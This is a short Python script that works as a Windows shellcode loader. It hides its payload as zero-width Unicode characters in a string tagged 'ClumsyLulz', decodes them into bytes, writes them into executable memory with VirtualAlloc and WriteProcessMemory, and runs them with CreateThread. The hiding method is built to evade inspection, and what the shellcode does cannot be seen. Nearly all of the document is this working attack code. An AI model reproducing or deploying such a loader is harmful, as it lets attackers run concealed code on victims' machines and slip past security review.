#!/usr/bin/env python3
s = '''‍​‌‌​‌​‌​​‌‌​​​​​​‌​‌‌​‌​​‌‌​‌​​​​‌‌​​​‌‌​‌‌​​​​‌​‌‌​‌‌​​​‌‌​​​‌‌​‌​‌​‌​​​‌​‌‌​​‌​‌​​‌​​​​​‌​‌​​‌‌‌​‌​‌​​​‌‌​​‌​‌​‌​​‌​​​‌​​​‌​‌‌​​‌‌​​‌​​‌​​‌​​​‌​​​‌​‌‌​‌‌‌​‌‌​​​​‌‌​​​​‌​​‌​​​‌​​​‌​‌‌​‌‌‌​‌‌​​​​‌​​​​​‌​​‌​​​‌​‌​‌‌​‌​‌​​‌​​​‌​​​‌​‌‌​​‌‌​​​​​‌​​‌​​​‌​​​‌​‌‌​‌‌‌‌‌‌​​​‌‌​​​​​​​​​​‌‌​‌​‌​‌‌‌​​‌‌‌‌​​‌​​​‌​‌‌​‌​‌‌‌​​​​​‌​‌‌‌​​‌​‌​​​‌​​​‌​‌‌​‌‌‌​‌​​​​​‌‌‌‌‌​​‌​​​​​​‌​​‌​​​​​​​​​​‌‌‌‌‌‌‌‌​‌​​​‌​‌‌​‌​‌​‌​​​​​‌‌‌‌‌​​‌​​‌​​​​​​‌‌‌‌‌​‌‌​‌‌‌​​‌​‌‌​​​​​‌​‌‌‌‌​​​‌‌​‌​‌​‌​​‌​​​​​​​‌​‌​‌​‌‌​‌‌​​​​​​‌​​‌‌‌‌​​​​​​​‌‌‌​‌​‌​‌‌‌​‌‌​‌​​‌​‌‌​‌‌‌​​‌​​​‌​‌​‌‌‌​‌​‌‌‌‌​‌‌‌‌‌​​​‌​‌‌​‌‌‌​‌​​​​​‌‌‌‌‌​​​‌‌‌​​​‌​​‌​​​​​​​​​​‌‌‌‌‌‌‌‌​‌​​​‌​‌‌​​‌‌​‌​​‌​‌​‌‌‌​​‌​​‌​​​​​​​​​​‌‌‌‌‌​‌‌‌‌​​‌‌​​‌‌‌‌‌‌‌‌‌‌‌​‌​‌‌‌‍ClumsyLulz'''
s = s.split("\xe2\x80\x8d")[1].replace("\xe2\x80","")
l = map(lambda x: x-0x8b, map(ord, s))
shellcode = "".join(chr(int("".join(map(str,l[i:i+8])),2)) for i in range(0,len(l),8))
from ctypes import *
ptr = windll.kernel32.VirtualAlloc(None, len(shellcode), 0x3000, 0x40)
hproc = windll.kernel32.OpenProcess(0x1F0FFF,False,windll.kernel32.GetCurrentProcessId())
windll.kernel32.WriteProcessMemory(hproc, ptr, shellcode, len(shellcode), byref(c_int(0)))
windll.kernel32.CreateThread(0,0,ptr,0,0,0)
windll.kernel32.WaitForSingleObject(c_int(-1), c_int(-1))
